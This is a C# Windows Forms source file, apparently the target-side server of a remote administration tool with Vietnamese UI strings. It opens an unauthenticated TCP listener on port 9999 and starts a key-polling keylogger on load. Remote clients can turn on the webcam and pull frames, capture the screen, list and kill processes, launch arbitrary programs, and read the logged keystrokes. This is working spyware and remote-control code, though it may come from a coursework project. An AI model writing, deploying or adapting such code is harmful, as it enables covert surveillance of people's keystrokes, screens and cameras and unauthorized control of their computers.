using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Collections.Generic;

namespace TargetApp
{
    public partial class Form1 : Form
    {
        TcpListener listener = null!;
        const int PORT = 9999;

        
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        System.Windows.Forms.Timer keylogTimer = new System.Windows.Forms.Timer();
        StringBuilder keyLogBuffer = new StringBuilder();

       
        FilterInfoCollection videoDevices = null!;
        VideoCaptureDevice videoSource = null!;
        string lastWebcamFrame = "";

      
        PictureBox pbCamLocal = new PictureBox();
        long lastFrameTime = 0;

        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            this.Load += Form1_Load;
            this.FormClosing += Form1_FormClosing;

            this.Text = "SERVER 9999 - SMART KILL APP";
            this.BackColor = Color.Cyan;
            this.WindowState = FormWindowState.Normal;
        }

        private void Form1_Load(object? sender, EventArgs e)
        {
       
            pbCamLocal.Name = "pbCamLocal";
            pbCamLocal.Size = new Size(640, 480);
            pbCamLocal.Location = new Point(10, 10);
            pbCamLocal.SizeMode = PictureBoxSizeMode.StretchImage;
            pbCamLocal.BackColor = Color.Black;
            pbCamLocal.Visible = true;
            this.Controls.Add(pbCamLocal);
            pbCamLocal.BringToFront();

            Thread t = new Thread(StartServer);
            t.IsBackground = true;
            t.Start();

            keylogTimer.Interval = 10;
            keylogTimer.Tick += KeylogTimer_Tick;
            keylogTimer.Start();
        }

        
        void StartServer()
        {
            try
            {
                listener = new TcpListener(IPAddress.Any, PORT);
                listener.Start();

                while (true)
                {
                    try
                    {
                        TcpClient client = listener.AcceptTcpClient();
                        Thread t = new Thread(HandleClient);
                        t.Start(client);
                    }
                    catch { }
                }
            }
            catch (Exception ex) { MessageBox.Show("Lỗi Server: " + ex.Message); }
        }

        void HandleClient(object? obj)
        {
            if (obj == null) return;
            TcpClient client = (TcpClient)obj;
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[1024 * 5000];

            try
            {
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead > 0)
                {
                    string request = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    string response = ProcessCommand(request);
                    byte[] resBytes = Encoding.UTF8.GetBytes(response);
                    stream.Write(resBytes, 0, resBytes.Length);
                }
            }
            catch { }
            finally
            {
                try { client.Close(); } catch { }
            }
        }

        string ProcessCommand(string cmd)
        {
            string[] parts = cmd.Split('|');
            string action = parts[0];
            string param = parts.Length > 1 ? parts[1] : "";

            switch (action)
            {
                case "WEBCAM_ON":
                    StartWebcam();
                    return "OK: Đã bật Camera";
                case "WEBCAM_OFF":
                    StopWebcam();
                    return "OK: Đã tắt Camera";
                case "WEBCAM_GET":
                    return string.IsNullOrEmpty(lastWebcamFrame) ? "NO_IMAGE" : lastWebcamFrame;

                case "LIST": return GetProcs();

                case "START":
                    try
                    {
                        Process.Start(param);
                        return "OK: Đã mở '" + param + "'";
                    }
                    catch (Exception ex) { return "Lỗi mở App: " + ex.Message; }

                case "STOP":
                    try
                    {
                        
                        if (int.TryParse(param, out int pid))
                        {
                            Process.GetProcessById(pid).Kill();
                            return "OK: Đã diệt PID " + pid;
                        }
                        
                        else
                        {
                            string searchName = param.ToLower().Replace(".exe", "").Trim();

                        
                            Process[] procs = Process.GetProcessesByName(searchName);

                            
                            if (procs.Length == 0)
                            {
                                Process[] allProcs = Process.GetProcesses();
                                List<Process> foundList = new List<Process>();

                                foreach (Process p in allProcs)
                                {
                                    
                                    if (p.ProcessName.ToLower().Contains(searchName))
                                    {
                                        foundList.Add(p);
                                    }
                                }
                                procs = foundList.ToArray();
                            }

                         
                            if (procs.Length == 0) return "Lỗi: Không tìm thấy app nào có tên chứa '" + param + "'";

                            int count = 0;
                            foreach (Process p in procs)
                            {
                                try { p.Kill(); count++; } catch { }
                            }
                            return "OK: Đã diệt "  + param;
                        }
                    }
                    catch (Exception ex) { return "Lỗi: " + ex.Message; }

                case "KEYLOG": string k = keyLogBuffer.ToString(); keyLogBuffer.Clear(); return k;
                case "SCREENSHOT": return GetScreen();

                default: return "Lỗi: Lệnh không tồn tại";
            }
        }

        string GetProcs()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                Process[] processes = Process.GetProcesses();
                foreach (Process p in processes)
                {
                    sb.AppendLine("PID: " + p.Id + " - Name: " + p.ProcessName);
                }
                return sb.ToString();
            }
            catch (Exception ex) { return "Lỗi: " + ex.Message; }
        }
        void StartWebcam()
        {
            try
            {
                if (videoSource != null && videoSource.IsRunning) return;

                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0) return;

                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

                
                VideoCapabilities? bestConfig = null;
                foreach (VideoCapabilities cap in videoSource.VideoCapabilities)
                {
                    if (bestConfig == null) bestConfig = cap;
                    else
                    {
                        if (cap.AverageFrameRate > bestConfig.AverageFrameRate) bestConfig = cap;
                        else if (cap.AverageFrameRate == bestConfig.AverageFrameRate)
                        {
                            if (cap.FrameSize.Width > bestConfig.FrameSize.Width && cap.FrameSize.Width <= 1280)
                                bestConfig = cap;
                        }
                    }
                }
                if (bestConfig != null) videoSource.VideoResolution = bestConfig;

                videoSource.NewFrame += VideoSource_NewFrame;
                videoSource.Start();

                this.Invoke((MethodInvoker)delegate { pbCamLocal.Visible = true; });
            }
            catch (Exception ex) { MessageBox.Show("Lỗi bật cam: " + ex.Message); }
        }

        void StopWebcam()
        {
            if (videoSource != null && videoSource.IsRunning)
            {
                videoSource.SignalToStop();
                videoSource.WaitForStop();
                videoSource = null!;
            }
            this.Invoke((MethodInvoker)delegate { pbCamLocal.Image = null; });
        }

        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                long now = DateTime.Now.Ticks / TimeSpan.TicksPerMillisecond;
                if (now - lastFrameTime < 15) return;
                lastFrameTime = now;

                Bitmap frame = (Bitmap)eventArgs.Frame.Clone();

                using (Bitmap resized = new Bitmap(frame, new Size(640, 480)))
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        resized.Save(ms, ImageFormat.Jpeg);
                        lastWebcamFrame = Convert.ToBase64String(ms.ToArray());
                    }
                }

                this.Invoke((MethodInvoker)delegate
                {
                    if (pbCamLocal.Image != null)
                    {
                        var old = pbCamLocal.Image;
                        pbCamLocal.Image = null;
                        old.Dispose();
                    }
                    pbCamLocal.Image = (Bitmap)frame.Clone();
                });

                frame.Dispose();
            }
            catch { }
        }

        string GetScreen()
        {
            try
            {
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap)) g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
            catch { return ""; }
        }

        private void KeylogTimer_Tick(object? sender, EventArgs e)
        {
            for (int i = 0; i < 255; i++) if (GetAsyncKeyState(i) == -32767) keyLogBuffer.Append(((Keys)i).ToString() + " ");
        }

        private void Form1_FormClosing(object? sender, FormClosingEventArgs e)
        {
            StopWebcam();
            if (listener != null) listener.Stop();
        }
    }
}